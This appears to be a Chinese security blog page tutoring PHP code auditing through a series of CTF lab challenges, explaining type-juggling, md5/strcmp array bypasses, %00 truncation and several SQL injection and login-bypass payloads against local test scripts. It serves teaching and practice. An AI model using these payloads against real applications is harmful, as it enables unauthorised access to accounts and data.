@@ -1,0 +1,602 @@
+<!DOCTYPE html>
+<html>
+  <head><meta name="generator" content="Hexo 3.9.0">
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <meta name="referrer" content="no-referrer">
+  <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport">
+  <meta name="description" content="关注网络安全">
+  <meta name="keyword" content="web安全 代码审计">
+  
+    <link rel="shortcut icon" href="/css/images/logo.png">
+  
+  <title>
+    
+      PHP代码审计分段讲解 | 影风博客
+    
+  </title>
+  <link href="//cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">
+  <link href="//cdnjs.cloudflare.com/ajax/libs/nprogress/0.2.0/nprogress.min.css" rel="stylesheet">
+  <link href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/styles/[object Object].min.css" rel="stylesheet">
+  <link rel="stylesheet" href="/css/style.css">
+  
+  <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+  <script src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+  <script src="//cdnjs.cloudflare.com/ajax/libs/geopattern/1.2.3/js/geopattern.min.js"></script>
+  <script src="//cdnjs.cloudflare.com/ajax/libs/nprogress/0.2.0/nprogress.min.js"></script>
+  
+    <script src="/js/qrious.js"></script>
+  
+  
+  
+  
+    <!-- MathJax support START -->
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Config({
+        tex2jax: {
+          inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+          processEscapes: true,
+          skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+        }
+      });
+    </script>
+
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for (i=0; i < all.length; i += 1) {
+          all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+      });
+    </script>
+    <script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+    <!-- MathJax support END -->
+  
+
+
+<link rel="stylesheet" href="/css/prism-story.css" type="text/css">
+<link rel="stylesheet" href="/css/prism-line-numbers.css" type="text/css"></head>
+<div class="wechat-share">
+  <img src="/css/images/logo.png">
+</div>
+
+  <body>
+    <header class="header fixed-header">
+  <div class="header-container">
+    <a class="home-link" href="/">
+      <div class="logo"></div>
+      <span>影风博客</span>
+    </a>
+    <ul class="right-list">
+      
+        <li class="list-item">
+          
+            <a href="/" class="item-link">主页</a>
+          
+        </li>
+      
+        <li class="list-item">
+          
+            <a href="/archives/" class="item-link">归档</a>
+          
+        </li>
+      
+        <li class="list-item">
+          
+            <a href="/tags/" class="item-link">标签</a>
+          
+        </li>
+      
+        <li class="list-item">
+          
+            <a href="/about/" class="item-link">关于</a>
+          
+        </li>
+      
+    </ul>
+    <div class="menu">
+      <span class="icon-bar"></span>
+      <span class="icon-bar"></span>
+      <span class="icon-bar"></span>
+    </div>
+    <div class="menu-mask">
+      <ul class="menu-list">
+        
+          <li class="menu-item">
+            
+              <a href="/" class="menu-link">主页</a>
+            
+          </li>
+        
+          <li class="menu-item">
+            
+              <a href="/archives/" class="menu-link">归档</a>
+            
+          </li>
+        
+          <li class="menu-item">
+            
+              <a href="/tags/" class="menu-link">标签</a>
+            
+          </li>
+        
+          <li class="menu-item">
+            
+              <a href="/about/" class="menu-link">关于</a>
+            
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</header>
+
+    <div id="article-banner">
+  <h2>PHP代码审计分段讲解</h2>
+  <p class="post-date">2019-03-03</p>
+  <div class="arrow-down">
+    <a href="javascript:;"></a>
+  </div>
+</div>
+<main class="app-body flex-box">
+  <!-- Article START -->
+  <article class="post-article">
+    <section class="markdown-content"><p>代码审计对于很多安全圈的新人来说，一直是一件头疼的事情，也想跟着大牛们直接操刀审计<code>CMS</code>？却处处碰壁：</p>
+<pre><code>函数看不懂！
+漏洞原理不知道！
+PHP特性更不知！</code></pre><p><strong>那还怎么愉快审计？</strong></p>
+<p>不如化繁为简，跟着本项目先搞懂<code>PHP</code>中大多敏感函数与各类特性，再逐渐增加难度，直到可以吊打各类<code>CMS</code>~</p>
+<p>本项目讲解基于多道<code>CTF</code>题，玩<code>CTF</code>的<code>WEB</code>狗也不要错过<code>(＾－＾)V</code></p>
+<p>题的源码在<code>Github</code>: <a href="https://github.com/bowu678/php_bugs" target="_blank">bowu(Github)</a>，可以自行部署，也可以静态审计。</p>
+<p><strong>欢迎贡献题目与解答，代表各位小白感激不尽~</strong></p>
+<h2 id="01-extract变量覆盖"><a href="#01-extract变量覆盖" class="headerlink" title="01 extract变量覆盖"></a>01 extract变量覆盖</h2><pre><code>http://127.0.0.1/Php_Bug/extract1.php?shiyan=&amp;flag=1</code></pre><h2 id="02-绕过过滤的空白字符"><a href="#02-绕过过滤的空白字符" class="headerlink" title="02 绕过过滤的空白字符"></a>02 绕过过滤的空白字符</h2><p>可以引入<code>\f</code>（也就是<code>%0c</code>）在数字前面，来绕过最后那个<code>is_palindrome_number</code>函数，而对于前面的数字判断，因为<code>intval</code>和<code>is_numeric</code>都会忽略这个字符，所以不会影响。</p>
+<pre><code>http://127.0.0.1/Php_Bug/02.php?number=%00%0c191</code></pre><p>资料：</p>
+<p><a href="https://www.leavesongs.com/PENETRATION/some-sangebaimao-ctf-writeups.html#phpfuzz" target="_blank">PHP类型与逻辑+fuzz与源代码审计</a></p>
+<h2 id="03-多重加密"><a href="#03-多重加密" class="headerlink" title="03 多重加密"></a>03 多重加密</h2><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+<span class="token variable">$arr</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'user'</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token string">'ichunqiu'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$token</span> <span class="token operator">=</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">gzcompress</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$arr</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">print_r</span><span class="token punctuation">(</span><span class="token variable">$token</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token comment" spellcheck="true">// echo $token;</span>
+<span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<pre><code>eJxLtDK0qs60MrBOAuJaAB5uBBQ=</code></pre><h2 id="04-SQL注入-WITH-ROLLUP绕过"><a href="#04-SQL注入-WITH-ROLLUP绕过" class="headerlink" title="04 SQL注入_WITH ROLLUP绕过"></a>04 SQL注入_WITH ROLLUP绕过</h2><pre><code>admin&#39; GROUP BY password WITH ROLLUP LIMIT 1 OFFSET 1-- - </code></pre><p>资料：</p>
+<p><a href="http://blog.csdn.net/qq_35078631/article/details/54772798" target="_blank">实验吧 因缺思汀的绕过 By Assassin（with rollup统计）</a></p>
+<p><a href="http://blog.csdn.net/id19870510/article/details/6254358" target="_blank">使用 GROUP BY WITH ROLLUP 改善统计性能</a></p>
+<p><a href="http://11856238.blog.51cto.com/11846238/1947610" target="_blank">因缺思汀的绕过</a></p>
+<h2 id="05-ereg正则-00截断"><a href="#05-ereg正则-00截断" class="headerlink" title="05 ereg正则%00截断"></a>05 ereg正则%00截断</h2><pre><code>http://127.0.0.1/Php_Bug/05.php?password=1e9%00*-*</code></pre><p>资料：</p>
+<p><a href="http://www.am0s.com/functions/203.html" target="_blank">eregi()</a></p>
+<h2 id="06-strcmp比较字符串"><a href="#06-strcmp比较字符串" class="headerlink" title="06 strcmp比较字符串"></a>06 strcmp比较字符串</h2><pre><code>http://127.0.0.1/Php_Bug/06.php?a[]=1</code></pre><p>这个函数是用于比较字符串的函数</p>
+<pre class="line-numbers language-php"><code class="language-php">int <span class="token function">strcmp</span> <span class="token punctuation">(</span> string <span class="token variable">$str1</span> <span class="token punctuation">,</span> string <span class="token variable">$str2</span> <span class="token punctuation">)</span>
+<span class="token comment" spellcheck="true">// 参数 str1第一个字符串。str2第二个字符串。如果 str1 小于 str2 返回 </span><span class="token markup">&lt; 0； 如果 str1 大于 str2 返回 ></span> <span class="token number">0</span>；如果两者相等，返回 <span class="token number">0</span>。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<p>可知，传入的期望类型是字符串类型的数据，但是如果我们传入非字符串类型的数据的时候，这个函数将会有怎么样的行为呢？实际上，当这个函数接受到了不符合的类型，这个函数将发生错误，但是在<code>5.3</code>之前的<code>php</code>中，显示了报错的警告信息后，将<code>return 0</code> !!!! 也就是虽然报了错，但却判定其相等了。这对于使用这个函数来做选择语句中的判断的代码来说简直是一个致命的漏洞，当然，<code>php</code>官方在后面的版本中修复了这个漏洞，使得报错的时候函数不返回任何值。<code>strcmp</code>只会处理字符串参数，如果给个数组的话呢，就会返回<code>NULL</code>,而判断使用的是<code>==</code>，<code>NULL==0</code>是 <code>bool(true)</code></p>
+<h2 id="07-sha-函数比较绕过"><a href="#07-sha-函数比较绕过" class="headerlink" title="07 sha()函数比较绕过"></a>07 sha()函数比较绕过</h2><pre><code>http://127.0.0.1/Php_Bug/07.php?name[]=1&amp;password[]=2</code></pre><p><code>===</code>会比较类型，比如<code>bool</code>。</p>
+<p><code>sha1()</code>函数和<code>md5()</code>函数存在着漏洞，<code>sha1()</code>函数默认的传入参数类型是字符串型，那要是给它传入数组呢会出现错误，使<code>sha1()</code>函数返回错误，也就是返回<code>false</code>，这样一来<code>===</code>运算符就可以发挥作用了，需要构造<code>username</code>和<code>password</code>既不相等，又同样是数组类型</p>
+<pre><code>?name[]=a&amp;amp;password[]=b</code></pre><h2 id="08-SESSION验证绕过"><a href="#08-SESSION验证绕过" class="headerlink" title="08 SESSION验证绕过"></a>08 SESSION验证绕过</h2><pre><code>http://127.0.0.1/Php_Bug/08.php?password=</code></pre><p>删除<code>cookies</code>或者删除<code>cookies</code>的值</p>
+<p>资料：</p>
+<p><a href="http://blog.csdn.net/lymingha0/article/details/44079981" target="_blank">[Write up] Boston Key Party CTF 2015(部分题目)</a></p>
+<h2 id="09-密码md5比较绕过"><a href="#09-密码md5比较绕过" class="headerlink" title="09 密码md5比较绕过"></a>09 密码md5比较绕过</h2><pre class="line-numbers language-php"><code class="language-php"><span class="token operator">?</span>user<span class="token operator">=</span><span class="token string">' union select '</span>e10adc3949ba59abbe56e057f20f883e' <span class="token shell-comment comment">#&amp;pass=123456</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>资料：</p>
+<p><a href="http://www.storysec.com/dutctf-2015-writeup.html" target="_blank">DUTCTF-2015-Writeup</a></p>
+<h2 id="10-urldecode二次编码绕过"><a href="#10-urldecode二次编码绕过" class="headerlink" title="10 urldecode二次编码绕过"></a>10 urldecode二次编码绕过</h2><p><code>h</code>的<code>URL</code>编码为：<code>%68</code>，二次编码为<code>%2568</code>，绕过</p>
+<pre><code>http://127.0.0.1/Php_Bug/10.php?id=%2568ackerDJ</code></pre><p>资料：</p>
+<p><a href="https://baike.baidu.com/item/URL%E7%BC%96%E7%A0%81" target="_blank">URL编码表</a></p>
+<h2 id="11-sql闭合绕过"><a href="#11-sql闭合绕过" class="headerlink" title="11 sql闭合绕过"></a>11 sql闭合绕过</h2><p>构造<code>exp</code>闭合绕过</p>
+<pre><code>admin&#39;)#</code></pre><h2 id="12-X-Forwarded-For绕过指定IP地址"><a href="#12-X-Forwarded-For绕过指定IP地址" class="headerlink" title="12 X-Forwarded-For绕过指定IP地址"></a>12 X-Forwarded-For绕过指定IP地址</h2><p><code>HTTP</code>头添加<code>X-Forwarded-For:1.1.1.1</code></p>
+<h2 id="13-md5加密相等绕过"><a href="#13-md5加密相等绕过" class="headerlink" title="13 md5加密相等绕过"></a>13 md5加密相等绕过</h2><pre><code>http://127.0.0.1/Php_Bug/13.php?a=240610708</code></pre><p><code>==</code>对比的时候会进行数据转换，<code>0eXXXXXXXXXX</code> 转成<code>0</code>了，如果比较一个数字和字符串或者比较涉及到数字内容的字符串，则字符串会被转换为数值并且比较按照数值来进行 </p>
+<pre class="line-numbers language-php"><code class="language-php"><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token string">'240610708'</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token string">'QNKCDZO'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token string">'aabg7XSs'</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token string">'aabC9RqS'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">sha1</span><span class="token punctuation">(</span><span class="token string">'aaroZmOk'</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token function">sha1</span><span class="token punctuation">(</span><span class="token string">'aaK1STfY'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">sha1</span><span class="token punctuation">(</span><span class="token string">'aaO8zKZF'</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token function">sha1</span><span class="token punctuation">(</span><span class="token string">'aa3OFF9m'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token string">'0010e2'</span> <span class="token operator">==</span> <span class="token string">'1e3'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token string">'0x1234Ab'</span> <span class="token operator">==</span> <span class="token string">'1193131'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token string">'0xABCdef'</span> <span class="token operator">==</span> <span class="token string">' 0xABCdef'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token function">md5</span><span class="token punctuation">(</span><span class="token string">'240610708'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 0e462097431906509019562988736854 </span>
+<span class="token function">md5</span><span class="token punctuation">(</span><span class="token string">'QNKCDZO'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 0e830400451993494058024219903391 </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>把你的密码设成 <code>0x1234Ab</code>，然后退出登录再登录，换密码 <code>1193131</code>登录，如果登录成功，那么密码绝对是明文保存的没跑。 </p>
+<p>同理，密码设置为 <code>240610708</code>，换密码 <code>QNKCDZO</code>登录能成功，那么密码没加盐直接<code>md5</code>保存的。</p>
+<p>资料：</p>
+<p><a href="https://www.v2ex.com/t/188364" target="_blank">PHP探测任意网站密码明文/加密手段办法</a></p>
+<h2 id="14-intval函数四舍五入"><a href="#14-intval函数四舍五入" class="headerlink" title="14 intval函数四舍五入"></a>14 intval函数四舍五入</h2><p><code>1024.1</code>绕过</p>
+<p>资料：</p>
+<p><a href="http://blog.csdn.net/wangjian1012/article/details/51581564" target="_blank">PHP intval()函数利用</a></p>
+<h2 id="15-strpos数组绕过NULL与ereg正则-00截断"><a href="#15-strpos数组绕过NULL与ereg正则-00截断" class="headerlink" title="15 strpos数组绕过NULL与ereg正则%00截断"></a>15 strpos数组绕过NULL与ereg正则%00截断</h2><ul>
+<li>方法一：</li>
+</ul>
+<p>既要是纯数字,又要有<code>#biubiubiu</code>，<code>strpos()</code>找的是字符串,那么传一个数组给它,<code>strpos()</code>出错返回<code>null,null!==false</code>，所以符合要求。<br>所以输入<code>nctf[]=</code>那为什么<code>ereg()</code>也能符合呢？因为<code>ereg()</code>在出错时返回的也是<code>null</code>，<code>null!==false</code>，所以符合要求。 </p>
+<ul>
+<li>方法二：</li>
+</ul>
+<p>字符串截断，利用<code>ereg()</code>的<code>NULL</code>截断漏洞，绕过正则过滤</p>
+<p><code>http://127.0.0.1/Php_Bug/16.php?nctf=1%00#biubiubiu</code> 错误</p>
+<p>需将<code>#</code>编码</p>
+<p><code>http://127.0.0.1/Php_Bug/16.php?nctf=1%00%23biubiubiu</code> 正确</p>
+<h2 id="16-SQL注入or绕过"><a href="#16-SQL注入or绕过" class="headerlink" title="16 SQL注入or绕过"></a>16 SQL注入or绕过</h2><pre class="line-numbers language-php"><code class="language-php"><span class="token variable">$query</span><span class="token operator">=</span><span class="token string">'SELECT * FROM users WHERE name=\''</span>admin\<span class="token string">'\' AND pass=\''</span><span class="token keyword">or</span> <span class="token number">1</span> <span class="token shell-comment comment">#</span><span class="token string">'\';'</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre class="line-numbers language-sql"><code class="language-sql">?username<span class="token operator">=</span>admin\'\' <span class="token operator">AND</span> pass<span class="token operator">=</span>\''<span class="token operator">or</span> <span class="token number">1</span> <span class="token comment" spellcheck="true">#&amp;password=</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h2 id="17-密码md5比较绕过"><a href="#17-密码md5比较绕过" class="headerlink" title="17 密码md5比较绕过"></a>17 密码md5比较绕过</h2><pre class="line-numbers language-sql"><code class="language-sql"><span class="token comment" spellcheck="true">//select pw from ctf where user=''and 0=1 union select  'e10adc3949ba59abbe56e057f20f883e' #</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre class="line-numbers language-php"><code class="language-php"><span class="token operator">?</span>user<span class="token operator">=</span><span class="token string">'and 0=1 union select  '</span>e10adc3949ba59abbe56e057f20f883e' <span class="token shell-comment comment">#&amp;pass=123456</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h2 id="18-md5-函数-使用数组绕过"><a href="#18-md5-函数-使用数组绕过" class="headerlink" title="18 md5()函数===使用数组绕过"></a>18 md5()函数===使用数组绕过</h2><p>若为<code>md5($_GET[&#39;username&#39;]) == md5($_GET[&#39;password&#39;])</code><br>则可以构造：</p>
+<pre><code>http://127.0.0.1/Php_Bug/18.php?username=QNKCDZO&amp;password=240610708</code></pre><p>因为<code>==</code>对比的时候会进行数据转换，<code>0eXXXXXXXXXX</code>转成<code>0</code>了<br>也可以使用数组绕过</p>
+<pre><code>http://127.0.0.1/Php_Bug/18.php?username[]=1&amp;password[]=2</code></pre><p>但此处是<code>===</code>，只能用数组绕过，<code>PHP</code>对数组进行<code>hash</code>计算都会得出<code>null</code>的空值</p>
+<pre><code>http://127.0.0.1/Php_Bug/18.php?username[]=1&amp;password[]=2</code></pre><h2 id="19-ereg-函数strpos-函数用数组返回NULL绕过"><a href="#19-ereg-函数strpos-函数用数组返回NULL绕过" class="headerlink" title="19 ereg()函数strpos() 函数用数组返回NULL绕过"></a>19 ereg()函数strpos() 函数用数组返回NULL绕过</h2><ul>
+<li>方法一：</li>
+</ul>
+<p><code>ereg()</code>正则函数可以用<code>%00</code>截断</p>
+<pre><code>http://127.0.0.1/Php_Bug/19.php?password=1%00--</code></pre><ul>
+<li>方法二：</li>
+</ul>
+<p>将<code>password</code>构造一个<code>arr[]</code>，传入之后，<code>ereg</code>是返回<code>NULL</code>的，<code>===</code>判断<code>NULL</code>和 <code>FALSE</code>，是不相等的，所以可以进入第二个判断，而<code>strpos</code>处理数组，也是返回<code>NULL</code>，注意这里的是<code>!==</code>，<code>NULL!==FALSE</code>，条件成立，拿到<code>flag</code></p>
+<pre><code>http://127.0.0.1/Php_Bug/19.php?password[]=</code></pre><h2 id="20-十六进制与数字比较"><a href="#20-十六进制与数字比较" class="headerlink" title="20 十六进制与数字比较"></a>20 十六进制与数字比较</h2><p>这里，它不让输入<code>1</code>到<code>9</code>的数字，但是后面却让比较一串数字，平常的方法肯定就不能行了，大家都知道计算机中的进制转换，当然也是可以拿来比较的，<code>0x</code>开头则表示<code>16</code>进制，将这串数字转换成<code>16</code>进制之后发现，是<code>deadc0de</code>，在开头加上<code>0x</code>，代表这个是<code>16</code>进制的数字，然后再和十进制的<code>3735929054</code>比较，答案当然是相同的，返回<code>true</code>拿到<code>flag</code></p>
+<pre class="line-numbers language-php"><code class="language-php"><span class="token keyword">echo</span>  <span class="token function">dechex</span> <span class="token punctuation">(</span> <span class="token number">3735929054</span> <span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 将3735929054转为16进制</span>
+<span class="token comment" spellcheck="true">//结果为：deadc0de</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<p>构造：</p>
+<pre><code>http://127.0.0.1/Php_Bug/20.php?password=0xdeadc0de</code></pre><h2 id="21-数字验证正则绕过"><a href="#21-数字验证正则绕过" class="headerlink" title="21 数字验证正则绕过"></a>21 数字验证正则绕过</h2><pre class="line-numbers language-php"><code class="language-php"><span class="token number">0</span> <span class="token operator">>=</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/^[[:graph:]]{12,}$/'</span><span class="token punctuation">,</span> <span class="token variable">$password</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>意为必须是<code>12</code>个字符以上（非空格非<code>TAB</code>之外的内容）</p>
+<pre class="line-numbers language-php"><code class="language-php"><span class="token variable">$reg</span> <span class="token operator">=</span> <span class="token string">'/([[:punct:]]+|[[:digit:]]+|[[:upper:]]+|[[:lower:]]+)/'</span><span class="token punctuation">;</span>
+<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token number">6</span> <span class="token operator">></span> <span class="token function">preg_match_all</span><span class="token punctuation">(</span><span class="token variable">$reg</span><span class="token punctuation">,</span> <span class="token variable">$password</span><span class="token punctuation">,</span> <span class="token variable">$arr</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<p>意为匹配到的次数要大于<code>6</code>次</p>
+<pre class="line-numbers language-php"><code class="language-php"><span class="token variable">$ps</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">'punct'</span><span class="token punctuation">,</span> <span class="token string">'digit'</span><span class="token punctuation">,</span> <span class="token string">'upper'</span><span class="token punctuation">,</span> <span class="token string">'lower'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//[[:punct:]] 任何标点符号 [[:digit:]] 任何数字  [[:upper:]] 任何大写字母  [[:lower:]] 任何小写字母 </span>
+<span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$ps</span> <span class="token keyword">as</span> <span class="token variable">$pt</span><span class="token punctuation">)</span> 
+<span class="token punctuation">{</span> 
+    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/[[:$pt:]]+/"</span><span class="token punctuation">,</span> <span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">)</span> 
+        <span class="token variable">$c</span> <span class="token operator">+</span><span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> 
+<span class="token punctuation">}</span> 
+<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$c</span> <span class="token operator">&lt;</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token keyword">break</span><span class="token punctuation">;</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>意为必须要有大小写字母，数字，字符内容三种与三种以上</p>
+<pre class="line-numbers language-php"><code class="language-php"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token string">"42"</span> <span class="token operator">==</span> <span class="token variable">$password</span><span class="token punctuation">)</span> <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span> <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>意为必须等于<code>42</code></p>
+<p>答案：</p>
+<pre><code>42.00e+00000000000 
+或
+420.000000000e-1</code></pre><p>资料：</p>
+<p><a href="http://www.bayescafe.com/php/yuebaomei-ctf.html" target="_blank">[安全宝「约宝妹」代码审计CTF题解]</a></p>
+<p><a href="https://3v4l.org/jYSpC" target="_blank">各种版本PHP在线迷你运行脚本</a></p>
+<p><a href="http://php.net/manual/en/language.operators.comparison.php" target="_blank">PHP Comparison Operators</a></p>
+<h2 id="22-弱类型整数大小比较绕过"><a href="#22-弱类型整数大小比较绕过" class="headerlink" title="22 弱类型整数大小比较绕过"></a>22 弱类型整数大小比较绕过</h2><pre class="line-numbers language-php"><code class="language-php"><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$temp</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"no numeric"</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token keyword">NULL</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>不能是数字</p>
+<pre class="line-numbers language-php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$temp</span><span class="token operator">></span><span class="token number">1336</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+    <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<p>又要大于<code>1336</code></p>
+<p>利用<code>PHP</code>弱类型的一个特性，当一个整形和一个其他类型行比较的时候，会先把其他类型<code>intval</code>再比。如果输入一个<code>1337a</code>这样的字符串，在<code>is_numeric</code>中返回<code>true</code>，然后在比较时被转换成数字<code>1337</code>，这样就绕过判断输出<code>flag</code>。</p>
+<pre><code>http://127.0.0.1/php_bug/22.php?password=1337a</code></pre><h2 id="23-md5函数验证绕过"><a href="#23-md5函数验证绕过" class="headerlink" title="23 md5函数验证绕过"></a>23 md5函数验证绕过</h2><p><code>if(md5($temp)==0)</code><br>要使<code>md5</code>函数加密值为<code>0</code></p>
+<ul>
+<li>方法一：</li>
+</ul>
+<p>使<code>password</code>不赋值，为<code>NULL</code>，<code>NULL == 0</code>为<code>true</code></p>
+<pre><code>http://127.0.0.1/php_bug/23.php?password=
+http://127.0.0.1/php_bug/23.php</code></pre><ul>
+<li>方法二：</li>
+</ul>
+<p>经过<code>MD5</code>运算后，为<code>0e******</code>的形式，其结果为<code>0*10</code>的<code>n</code>次方，结果还是零</p>
+<pre><code>http://127.0.0.1/php_bug/23.php?password=240610708
+http://127.0.0.1/php_bug/23.php?password=QNKCDZO</code></pre><h2 id="24-md5函数true绕过注入"><a href="#24-md5函数true绕过注入" class="headerlink" title="24 md5函数true绕过注入"></a>24 md5函数true绕过注入</h2><pre class="line-numbers language-php"><code class="language-php"><span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string">"SELECT * FROM users WHERE password = '"</span><span class="token punctuation">.</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">,</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">"'"</span><span class="token punctuation">;</span>
+<span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">,</span><span class="token boolean">true</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<p>将<code>md5</code>后的<code>hex</code>转换成字符串</p>
+<p>如果包含<code>&#39;or&#39;xxx</code>这样的字符串，那整个<code>sql</code>变成</p>
+<p><code>SELECT * FROM admin WHERE pass = &#39;&#39;or&#39;xxx&#39;</code>就绕过了</p>
+<p>字符串：<code>ffifdyop</code></p>
+<p><code>md5</code>后，<code>276f722736c95d99e921722cf9ed621c</code></p>
+<p><code>hex</code>转换成字符串：<code>&#39;or&#39;6&lt;trash&gt;</code></p>
+<p><img src="http://pic.storysec.com/2019/phpbugs/24_1.png" alt></p>
+<p>构造：<code>?password=ffifdyop</code></p>
+<p>资料：</p>
+<p><a href="https://joychou.org/web/SQL-injection-with-raw-MD5-hashes.html" target="_blank">MD5加密后的SQL注入</a></p>
+<p><a href="http://www.am0s.com/functions/204.html" target="_blank">敏感函数md5()</a></p>
+<p><a href="https://www.xmanblog.net/php-magic/" target="_blank">php黑魔法</a></p>
